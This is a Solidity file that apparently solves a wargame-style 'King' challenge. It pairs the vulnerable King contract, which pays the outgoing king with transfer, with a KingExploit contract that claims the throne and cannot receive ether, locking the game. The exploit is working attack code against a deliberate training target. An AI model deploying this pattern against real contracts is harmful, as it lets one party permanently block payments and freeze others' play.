// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingExploit {
    address public owner;

    constructor() public payable {
        owner = msg.sender;
    }

    function showBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public payable {
      require(msg.sender == owner, 'Only allowed');
      address payable to = payable(msg.sender);
      to.transfer(address(this).balance);
    }
   
    function exploitFallback(address recipient) public payable {
      require(msg.sender == owner, "Only owenr");
      (bool success,) = address(recipient).call{value: msg.value}("");
      require(success, "Send error");
    }
}

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  function showBalance() public view returns (uint256) {
        return address(this).balance;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}